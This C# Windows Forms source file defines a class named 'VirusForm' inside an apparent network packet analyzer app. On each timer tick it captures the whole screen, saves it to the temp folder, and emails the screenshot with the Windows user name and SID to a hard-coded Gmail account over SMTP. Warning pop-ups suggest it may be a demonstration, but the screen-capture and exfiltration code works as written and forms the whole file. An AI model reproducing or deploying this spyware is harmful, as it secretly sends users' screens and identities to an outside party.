using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Drawing.Imaging;
using System.Net;
using System.Windows.Forms;

namespace Network.Packet.Analyzer.App
{
    public partial class VirusForm : Form
    {
        public VirusForm()
        {
            InitializeComponent();
        }
        string printScreen = null;
        static int i = 0;
        private static Bitmap BitMapCreater()
        {
            Rectangle rect = Screen.PrimaryScreen.Bounds;
            int color = Screen.PrimaryScreen.BitsPerPixel;
            PixelFormat pFormat;
            switch (color)
            {
                case 8:
                case 16:
                    pFormat = PixelFormat.Format16bppRgb565;
                    break;

                case 24:
                    pFormat = PixelFormat.Format24bppRgb;
                    break;

                case 32:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;

                default:
                    pFormat = PixelFormat.Format32bppArgb;
                    break;
            }
            MessageBox.Show("Unknown file trying to send your data to anonymous email", "Be Careful", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Stop);
            Bitmap bmp = new Bitmap(rect.Width, rect.Height, pFormat);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(rect.Left, rect.Top, 0, 0, rect.Size);
            return bmp;
           
        }
        private static string sendMail(System.Net.Mail.MailMessage mm)
        {
            try
            {
                string smtpHost = "smtp.gmail.com";
                string userName = "usmanahmad.ahmad@gmail.com";//write your email address
                string password = "************";//write password
                System.Net.Mail.SmtpClient mClient = new System.Net.Mail.SmtpClient();
                mClient.Port = 587;
                mClient.EnableSsl = true;
                mClient.UseDefaultCredentials = false;
                mClient.Credentials = new NetworkCredential(userName, password);
                mClient.Host = smtpHost;
                mClient.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network;
                mClient.Send(mm);
                MessageBox.Show("Attention! Again data is sending from your machine", "Be Careful", MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Stop);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return "Send Sucessfully";
        }

        private void timer1_Tick_1_Click(object sender, EventArgs e)
        {
            i = i + 1;
            string sysName = string.Empty;
            string sysUser = string.Empty;
            Bitmap b = BitMapCreater();
            printScreen = string.Format("{0}{1}", Path.GetTempPath(), "screen" + i + ".jpg");
            b.Save(printScreen, ImageFormat.Jpeg);
            System.Net.Mail.MailAddress toAddress = new System.Net.Mail.MailAddress("usmanahmad.ahmad@gmail.com");
            System.Net.Mail.MailAddress fromAddress = new System.Net.Mail.MailAddress("usmanahmad.ahmad@gmail.com");
            System.Net.Mail.MailMessage mm = new System.Net.Mail.MailMessage(fromAddress, toAddress);
            sysName = System.Security.Principal.WindowsIdentity.GetCurrent().Name.ToString();
            sysUser = System.Security.Principal.WindowsIdentity.GetCurrent().User.ToString();
            mm.Subject = sysName + " " + sysUser;
            string filename = string.Empty;
            System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(printScreen);
            mm.Attachments.Add(mailAttachment);
            mm.IsBodyHtml = true;
            mm.BodyEncoding = System.Text.Encoding.UTF8;
            sendMail(mm);
            MessageBox.Show("Do you want to stop", "Stop it", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Hand);
        }
    }
}
